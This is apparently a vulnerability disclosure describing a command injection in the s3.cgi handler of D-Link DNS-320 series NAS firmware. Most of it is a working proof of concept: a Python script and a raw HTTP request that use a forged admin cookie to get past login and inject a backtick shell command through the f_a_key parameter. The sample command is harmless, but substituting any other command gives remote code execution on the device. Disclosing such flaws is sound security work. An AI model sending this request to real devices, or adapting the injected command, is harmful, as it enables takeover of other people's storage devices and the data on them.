# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_s3 function of the file /cgi-bin/s3.cgi.  The variable `f_a_key`is passed from a POST request and is assigned to `v6` via the `snprintf` function at line 58 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723734887159-58f00c30-75fe-4114-8724-f71d382a14ad.png#averageHue=%23fefefd&clientId=u31f1ee6a-4414-4&from=paste&height=1051&id=uf5f86eae&originHeight=1051&originWidth=1707&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129266&status=done&style=none&taskId=uf135c9d1-6129-4130-b367-f94e04cbd10&title=&width=1707)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/s3.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_s3&f_ups_ip=1&f_flag=1&path=/tmp&f_schedule_type=1&f_hour=1&f_job_name=1&f_dir=1&f_job_name=v14&f_dir=v27&f_a_key=`touch%09/tmp/125`&f_p_key=1&f_b_path=v12&f_location=v26&f_backuptype=v24&f_local_path=v7&f_schedule_type=v22&f_backup_now=v21&f_mon=v20&f_day=v16&f_hour=v19&f_min=1&s_type=v25&f_week=v17"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```java
POST /cgi-bin/s3.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_s3&f_ups_ip=1&f_flag=1&path=/tmp&f_schedule_type=1&f_hour=1&f_job_name=1&f_dir=1&f_job_name=v14&f_dir=v27&f_a_key=`touch%09/tmp/125`&f_p_key=1&f_b_path=v12&f_location=v26&f_backuptype=v24&f_local_path=v7&f_schedule_type=v22&f_backup_now=v21&f_mon=v20&f_day=v16&f_hour=v19&f_min=1&s_type=v25&f_week=v17
```

